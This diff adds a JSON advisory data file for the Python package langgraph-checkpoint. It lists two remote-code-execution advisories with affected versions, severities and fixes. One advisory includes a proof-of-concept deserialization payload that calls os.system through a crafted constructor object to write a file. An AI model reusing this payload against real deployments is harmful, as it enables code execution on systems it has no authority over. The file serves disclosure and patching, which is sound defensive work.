@@ -1,0 +1,319 @@
+{
+  "schema_version": 1,
+  "package": "langgraph-checkpoint",
+  "purls": [
+    "pkg:pypi/langgraph-checkpoint"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 45,
+  "advisories": [
+    {
+      "id": "GHSA-mhr3-j7m5-c7c9",
+      "primary_id": "CVE-2026-27794",
+      "aliases": [
+        "CVE-2026-27794"
+      ],
+      "cve_ids": [
+        "CVE-2026-27794"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "langgraph-checkpoint",
+      "summary": "LangGraph: BaseCache Deserialization of Untrusted Data may lead to Remote Code Execution ",
+      "details": "## Context\n\nA Remote Code Execution vulnerability exists in LangGraph's caching layer when applications enable cache backends that inherit from `BaseCache` and opt nodes into caching via `CachePolicy`. Prior to `langgraph-checkpoint` 4.0.0, `BaseCache` defaults to `JsonPlusSerializer(pickle_fallback=True)`. When msgpack serialization fails, cached values can be deserialized via `pickle.loads(...)`.\n\n### Who is affected?\n\nCaching is not enabled by default. Applications are affected only when:\n\n- The application explicitly enables a cache backend (for example by passing `cache=...` to `StateGraph.compile(...)` or otherwise configuring a `BaseCache` implementation)\n- One or more nodes opt into caching via `CachePolicy`\n- The attacker can write to the cache backend (for example a network-accessible Redis instance with weak/no auth, shared cache infrastructure reachable by other tenants/services, or a writable SQLite cache file)\n\nExample (enabling a cache backend and opting a node into caching):\n\n```py\nfrom langgraph.cache.memory import InMemoryCache\nfrom langgraph.graph import StateGraph\nfrom langgraph.types import CachePolicy\n\n\ndef my_node(state: dict) -> dict:\n    return {\"value\": state.get(\"value\", 0) + 1}\n\n\nbuilder = StateGraph(dict)\nbuilder.add_node(\"my_node\", my_node, cache_policy=CachePolicy(ttl=120))\nbuilder.set_entry_point(\"my_node\")\n\ngraph = builder.compile(cache=InMemoryCache())\n\nresult = graph.invoke({\"value\": 1})\n```\n\nWith `pickle_fallback=True`, when msgpack serialization fails, `JsonPlusSerializer` can fall back to storing values as a `(\"pickle\", <bytes>)` tuple and later deserialize them via `pickle.loads(...)`. If an attacker can place a malicious pickle payload into the cache backend such that the LangGraph process reads and deserializes it, this can lead to arbitrary code execution.\n\nExploitation requires attacker write access to the cache backend. The serializer is not exposed as a network-facing API.\n\nThis is fixed in `langgraph-checkpoint>=4.0.0` by disabling pickle fallback by default (`pickle_fallback=False`).\n\n## Impact\n\nArbitrary code execution in the LangGraph process when attacker-controlled cache entries are deserialized.\n\n## Root Cause\n\n- `BaseCache` default serializer configuration inherited by cache implementations (`InMemoryCache`, `RedisCache`, `SqliteCache`):\n  - `libs/checkpoint/langgraph/cache/base/__init__.py` (pre-fix default: `JsonPlusSerializer(pickle_fallback=True)`)\n\n- `JsonPlusSerializer` deserialization sink:\n  - `libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py`\n  - `loads_typed(...)` calls `pickle.loads(data_)` when `type_ == \"pickle\"` and pickle fallback is enabled\n\n## Attack preconditions\n\nAn attacker must be able to write attacker-controlled bytes into the cache backend such that the LangGraph process later reads and deserializes them.\n\nThis typically requires write access to a networked cache (for example a network-accessible Redis instance with weak/no auth or shared cache infrastructure reachable by other tenants/services) or write access to local cache storage (for example a writable SQLite cache file via permissive file permissions or a shared writable volume).\n\nBecause exploitation requires write access to the cache storage layer, this is a post-compromise / post-access escalation vector.\n\n## Remediation\n\n- Upgrade to `langgraph-checkpoint>=4.0.0`.\n\n## Resources\n\n- ZDI-CAN-28385\n- Patch: https://github.com/langchain-ai/langgraph/pull/6677\n- Patch diff: https://patch-diff.githubusercontent.com/raw/langchain-ai/langgraph/pull/6677.patch\n- Credit: Peter Girnus (@gothburz), Demeng Chen, and Brandon Niemczyk (Trend Micro Zero Day Initiative)",
+      "published": "2026-02-25T22:59:12Z",
+      "modified": "2026-02-25T23:02:44.202072Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/security/advisories/GHSA-mhr3-j7m5-c7c9"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27794"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/pull/6677"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/commit/f91d79d0c86932ded6e3b9f195d5a0bbd5aef99c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/langchain-ai/langgraph"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D4.0.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-mhr3-j7m5-c7c9",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.0.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.0",
+        "1.0.1",
+        "1.0.10",
+        "1.0.11",
+        "1.0.12",
+        "1.0.13",
+        "1.0.14",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.0.6",
+        "1.0.7",
+        "1.0.8",
+        "1.0.9",
+        "2.0.0",
+        "2.0.1",
+        "2.0.10",
+        "2.0.12",
+        "2.0.13",
+        "2.0.14",
+        "2.0.15",
+        "2.0.16",
+        "2.0.17",
+        "2.0.18",
+        "2.0.19",
+        "2.0.2",
+        "2.0.20",
+        "2.0.21",
+        "2.0.22",
+        "2.0.23",
+        "2.0.24",
+        "2.0.25",
+        "2.0.26",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "3.0.0",
+        "3.0.1"
+      ],
+      "affected_conda_versions": [
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.0.6",
+        "1.0.8",
+        "1.0.9",
+        "1.0.10",
+        "1.0.11",
+        "1.0.12",
+        "1.0.14",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.10",
+        "2.0.12",
+        "2.0.13",
+        "2.0.15",
+        "2.0.16",
+        "2.0.17",
+        "2.0.18",
+        "2.0.19",
+        "2.0.20",
+        "2.0.21",
+        "2.0.24",
+        "2.0.25",
+        "2.0.26",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "3.0.0",
+        "3.0.1"
+      ]
+    },
+    {
+      "id": "GHSA-wwqv-p2pp-99h5",
+      "primary_id": "CVE-2025-64439",
+      "aliases": [
+        "CVE-2025-64439"
+      ],
+      "cve_ids": [
+        "CVE-2025-64439"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "langgraph-checkpoint",
+      "summary": "LangGraph Checkpoint affected by RCE in \"json\" mode of JsonPlusSerializer ",
+      "details": "# Summary\n\nPrior to `langgraph-checkpoint` version `3.0` , LangGraph\u2019s `JsonPlusSerializer` (used as the default serialization protocol for all checkpointing) contains a remote code execution (RCE) vulnerability when deserializing payloads saved in the `\"json\"` serialization mode.\n\nIf an attacker can cause your application to persist a payload serialized in this mode, they may be able to also send malicious content that executes arbitrary Python code during deserialization.\n\nUpgrading to version langgraph-checkpoint `3.0` patches this vulnerability by preventing deserialization of custom objects saved in this mode.\n\nIf you are deploying in `langgraph-api`, any version `0.5` or later is also free of this vulnerability. \n\n# Details\n\n**Affected file / component**\n\n[jsonplus.py](https://github.com/langchain-ai/langgraph/blob/c5744f583b11745cd406f3059903e17bbcdcc8ac/libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py)\n\nBy default, the serializer attempts to use `\"msgpack\"` for serialization. However, prior to version `3.0` of the checkpointer library, if illegal Unicode surrogate values caused serialization to fail,  it would fall back to using the `\"json\"` mode.\n\nWhen operating in this mode, the deserializer supports a constructor-style format (`lc == 2`, `type == \"constructor\"`) for custom objects to allow them to be reconstructed at load time.  If an attacker is able to trigger this mode with a malicious payload, deserializing  allow the attacker to execute arbitrary functions upon load.\n\n---\n\n# Who is affected\n\nThis issue affects all users of `langgraph-checkpoint` **versions earlier than 3.0** who:\n\n1. Allow untrusted or user-supplied data to be persisted into checkpoints, and\n2. Use the default serializer (or explicitly instantiate `JsonPlusSerializer`) that may fall back to `\"json\"` mode.\n\nIf your application only processes trusted data or does not allow untrusted checkpoint writes, the practical risk is reduced.\n\n# Proof of Concept (PoC)\n\n```python\nfrom langgraph.graph import StateGraph \nfrom typing import TypedDict\nfrom langgraph.checkpoint.sqlite import SqliteSaver\n\nclass State(TypedDict):\n    foo: str\n    attack: dict\n\ndef my_node(state: State):\n    return {\"foo\": \"oops i fetched a surrogate \\ud800\"}\n\nwith SqliteSaver.from_conn_string(\"foo.db\") as saver:\n    graph = (\n\t    StateGraph(State).\n\t    add_node(\"my_node\", my_node).\n\t    add_edge(\"__start__\", \"my_node\").\n\t    compile(checkpointer=saver)\n\t )\n    \n\n    attack = {\n        \"lc\": 2,\n        \"type\": \"constructor\",\n        \"id\": [\"os\", \"system\"],\n        \"kwargs\": {\"command\": \"echo pwnd you > /tmp/pwnd.txt\"},\n    }\n    malicious_payload = {\n         \"attack\": attack,\n    }\n\n    thread_id = \"00000000-0000-0000-0000-000000000001\"\n    config = {\"thread_id\": thread_id}\n    # Malicious payload is saved in the first call\n    graph.invoke(malicious_payload, config=config)\n\n    # Malicious payload is deserialized and code is executed in the second call\n    graph.invoke({\"foo\": \"hi there\"}, config=config)\n\n```\n\nRunning this PoC writes a file `/tmp/pwnd.txt` to disk, demonstrating code execution.\n\nInternally, this exploits the following code path:\n\n```python\nfrom langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer\n\nserializer = JsonPlusSerializer() # Used within the checkpointer\n\nserialized = serializer.dumps_typed(malicious_payload)\nserializer.loads_typed(serialized)  # Executes os.system(...)\n\n```\n\n---\n\n# Fixed Version\n\nThe vulnerability is fixed in **`langgraph-checkpoint==3.0.0`**\n\nRelease link: https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D3.0.0\n\n---\n\n# Fix Description\n\nThe fix introduces an **allow-list** for constructor deserialization, restricting permissible `\"id\"` paths to explicitly approved module/class combinations provided at serializer construction.\n\nAdditionally, saving payloads in `\"json\"` format has been deprecated to remove this unsafe fallback path.\n\n---\n\n# Mitigation\n\nUpgrade immediately to `langgraph-checkpoint==3.0.0`.\n\nThis version is fully compatible with `langgraph>=0.3` and does **not** require any import changes or code modifications.\n\nIn `langgraph-api`, updating to `0.5` or later will automatically require the patched version of the checkpointer library.",
+      "published": "2025-11-05T19:52:50Z",
+      "modified": "2025-11-07T22:09:59.388287Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:H/SC:H/SI:H/SA:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/security/advisories/GHSA-wwqv-p2pp-99h5"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64439"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/commit/c5744f583b11745cd406f3059903e17bbcdcc8ac"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/langchain-ai/langgraph"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/blob/c5744f583b11745cd406f3059903e17bbcdcc8ac/libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D3.0.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-wwqv-p2pp-99h5",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.0.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.0",
+        "1.0.1",
+        "1.0.10",
+        "1.0.11",
+        "1.0.12",
+        "1.0.13",
+        "1.0.14",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.0.6",
+        "1.0.7",
+        "1.0.8",
+        "1.0.9",
+        "2.0.0",
+        "2.0.1",
+        "2.0.10",
+        "2.0.12",
+        "2.0.13",
+        "2.0.14",
+        "2.0.15",
+        "2.0.16",
+        "2.0.17",
+        "2.0.18",
+        "2.0.19",
+        "2.0.2",
+        "2.0.20",
+        "2.0.21",
+        "2.0.22",
+        "2.0.23",
+        "2.0.24",
+        "2.0.25",
+        "2.0.26",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2"
+      ],
+      "affected_conda_versions": [
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.0.6",
+        "1.0.8",
+        "1.0.9",
+        "1.0.10",
+        "1.0.11",
+        "1.0.12",
+        "1.0.14",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.10",
+        "2.0.12",
+        "2.0.13",
+        "2.0.15",
+        "2.0.16",
+        "2.0.17",
+        "2.0.18",
+        "2.0.19",
+        "2.0.20",
+        "2.0.21",
+        "2.0.24",
+        "2.0.25",
+        "2.0.26",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2"
+      ]
+    }
+  ]
+}
